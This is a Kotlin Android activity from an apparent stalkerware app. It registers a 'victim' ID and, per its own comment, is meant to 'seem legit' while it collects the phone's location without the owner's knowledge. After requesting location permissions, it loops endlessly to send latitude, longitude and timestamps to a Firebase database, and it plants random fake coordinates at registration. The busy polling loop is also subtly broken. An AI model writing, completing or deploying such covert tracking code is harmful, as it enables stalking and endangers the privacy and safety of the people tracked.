package com.theprogxy.tamtam

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.util.Calendar

const val MY_PERMISSIONS_REQUEST_MULTIPLE = 4

class RegisterActivity : Activity() {
    private lateinit var idEditText: EditText
    private lateinit var registerButton: Button
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var database: DatabaseReference
    private lateinit var getId: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_register)

        database = Firebase.database.reference

        val userPreferences = UserPreferences()
        val getId : String? = userPreferences.getValue("victimId", this)
        if (getId != null) {
            // Show some image to make the app seem legit
            this.getId = getId
            this.retrieveData(false)
            return
        }

        idEditText = findViewById(R.id.idEditText)
        registerButton = findViewById(R.id.registerButton)

        registerButton.setOnClickListener {
            val victimId = idEditText.text.toString()

            if (victimId != "") {
                val id: String = "id" + Math.random() * 1000
                if (!userPreferences.setValue("victimId", id, this)) {
                    Toast.makeText(this, "Failed registering the victim's id, please retry", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }

                this.registerVictim(id, victimId)

                val intent = Intent(this, Confirm::class.java)
                intent.putExtra("hashId", id)
                startActivity(intent)
                finish()
            } else Toast.makeText(this, "Empty victim id", Toast.LENGTH_SHORT).show()

            idEditText.text.clear()
        }
    }

    private fun registerVictim(id: String, victimId: String) {
        database.child(id).child("id").setValue(victimId)
        database.child(id).child("isTracked").setValue(false)
        val time = Calendar.getInstance().time.time
        database.child(id).child("lastUpdate").setValue(time)
        database.child(id).child("latitude").setValue(Math.random() * 100_000)
        database.child(id).child("longitude").setValue(Math.random() * 100_000)
        return
    }

    private fun checkPermission() : Boolean {
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
        )

        val permissionStatus = permissions.map {
            ContextCompat.checkSelfPermission(this, it)
        }

        if (!permissionStatus.all { it == PackageManager.PERMISSION_GRANTED }) {
            ActivityCompat.requestPermissions(this, permissions, MY_PERMISSIONS_REQUEST_MULTIPLE)
            return false
        }

        return true
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        when (requestCode) {
            MY_PERMISSIONS_REQUEST_MULTIPLE -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    this.retrieveData(true)
                    return
                } else {
                    print("Permission not granted")
                    return
                }
            }
        }
    }

    private fun retrieveData(permissionStatus: Boolean) {
        if (!permissionStatus) {
            if (!this.checkPermission()) return
        }

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        database.child(this.getId).child("isTracked").setValue(true)

        while (true) {
            var currentLocation: Location? = null
            fusedLocationClient.lastLocation.addOnSuccessListener { location : Location? -> currentLocation = location }

            if (currentLocation != null) {
                val time = Calendar.getInstance().time.time
                database.child(this.getId).child("lastUpdate").setValue(time)
                database.child(this.getId).child("latitude").setValue(currentLocation?.latitude)
                database.child(this.getId).child("longitude").setValue(currentLocation?.longitude)
            }
        }
    }

}
